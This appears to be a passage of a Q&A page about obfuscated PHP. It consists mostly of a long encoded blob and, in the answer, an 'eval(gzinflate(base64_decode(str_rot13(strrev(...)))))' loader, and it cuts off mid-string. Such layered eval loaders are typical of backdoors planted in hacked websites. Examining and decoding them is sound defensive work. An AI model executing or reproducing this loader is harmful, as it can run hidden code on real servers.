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'))))); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:09:02.907

```
<?php

$code = <<<CODE
eval(gzinflate(base64_decode(str_rot13(strrev('==jC9/3aks/9//950fElFo+AhZMoHt5ptamYrSq0F2D9nrc/sBsgZkRIjULvIIa5E0RVGJPIDYErPtxPPVzfh+hlTjjCovI7l2N37C3bPDVxFQ3VrqwHRk4z55vuxZjGro526lFixNQ3ZwmYAA88DzUTzJPk3zwJR9Lsb5VbUg1owEOEGXUL0fVvoTtZWcefoBbqBXK8t/aQTitbtgjJYT3ILq9i8PFvMj9JOp/pcKg/dq55QUPGeaIXyF527EzebhDbKPg5vMLAJchFIHs/NBlNhX4zc08EZ2ppkok7Sgle+uZfLdtf0jB6NFJ1c7qLx39T9msPaYxUH8dTlUEodCvEoeW2awQfph/wwEBr44F9/smLayS4OIAA9ykR6L14YnyZCzV3Wmy2aVDT3SeYn6MadB7v6q1p6+BeLfLUp/OsurpGjnn1Q+XnPFRytt6NaMI5BET/QQwLdzC1IzU0sFncqYvrMWLdOe9R2lNm6+Vj0NYGf3b6IwCzDFhVBk5WF8cuTx+9Q3tsvw28qwvAvB7ry2Ip4W5gHKX2vBMmdHhHh/jSeilWj7CwgBSosAhXNvpB8rKhyS3Tl6W5IuD6oASm4997Qd/Op441vIB9N9LPc7fk4bax7alaa3KC4LbHAjljgKAEeYkCaSbbjpF9S1LPLs3JkXUzjRa813Tvlr5tXpJfAvxDy73FwnWreCR15S+0NLW3mmTwak/MfIChSpyF9m8lZvRHi2ZRO6b+yQQLXXIo9I96Tb96mBKhk6mU6T894UuvZVsEILA1XatLb6+nAeKklBdJunt/af8nklJ2KdObY/+9Z25Khuf1lWCp/vD+XZkNY9J3d9PMHeOOsmMMMV1XpANyiMaaNuCX+HFI6lAqftdo+w8lnsAKc9od/VFk57mZAlupJO5sVrF5hRGkW6+QH7ZyQ1tYAwCD7x0Xm/TV+PFwd6FOM/eGnmmGRQT+Pj+d+3CHHno0xNVRFiblvBHCw8xqVJjMfhtSolrGO/f6fCt74mgLzsxzGJNTqGgaPo62JXGOimWY0Yckk